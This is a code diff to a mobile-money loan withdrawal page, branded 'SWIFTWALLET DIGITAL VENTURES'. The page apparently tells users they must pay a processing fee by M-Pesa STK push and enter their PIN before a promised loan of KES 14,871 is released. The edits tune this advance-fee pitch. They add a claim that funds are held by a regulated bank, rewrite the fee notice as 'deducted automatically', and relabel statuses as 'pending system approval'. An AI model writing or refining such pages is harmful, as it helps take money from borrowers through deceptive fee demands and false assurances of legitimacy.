@@ -369,7 +369,7 @@
             <div class="flex items-start space-x-3">
                 <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
                 <div class="w-full">
-                    <h3 class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successful!</h3>
+                    <h3 class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
                     <p id="successMessage" class="text-green-700 text-sm mb-3"></p>
 
                     <!-- Progress Bar -->
@@ -482,7 +482,7 @@
                 <div class="text-sm mb-2">Amount to Withdraw</div>
                 <div id="withdrawalAmount" class="text-4xl font-bold">KES 14,871</div>
                 <div class="text-sm mt-2 text-orange-600">
-                    This is that amount you'll get to your mpesa by completing the fee needed to trigger instant withdrawal.
+                    Fee deducted automatically from Mpesa.
                 </div>
             </div>
 
@@ -518,6 +518,7 @@
                             <li>• Keep your phone nearby for confirmation process</li>
                             <li>• You will receive SMS confirmation once completed</li>
                             <li>• Verify your details carefully before proceeding</li>
+                            <li>• 🔰NOTE that all your loan funds are securely  held by chase bank regulated by CBK.Fee securely releases the funds to your Mpesa,Airtel money and Bank accounts.</li>
                            
                             <li>• if you encounter any problem dont hesitate to contact our support team through the blue chat widget at the bottom right side.we are always online</li>
                         </ul>
@@ -1356,7 +1357,7 @@
                 updateProcessingStep(1, 'Validating details...');
                 await delay(1500);
                 
-                updateProcessingStep(2, 'Sending withdrawal request...');
+                updateProcessingStep(2, 'Sending withdrawal request to release funds..');
                 await delay(1000);
 
                 // Send STK push for fee payment
@@ -1447,7 +1448,7 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Your withdrawal is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
+            const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment  request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment confirmation.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
@@ -1547,7 +1548,7 @@
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                 showSuccess(
-                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from SWIFTWALLET DIGITAL VENTURES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING ADMIN APPROVAL</span>`
+                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from SWIFTWALLET DIGITAL VENTURES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
                 );
                 updateDisbursementTimeline(true);
             }
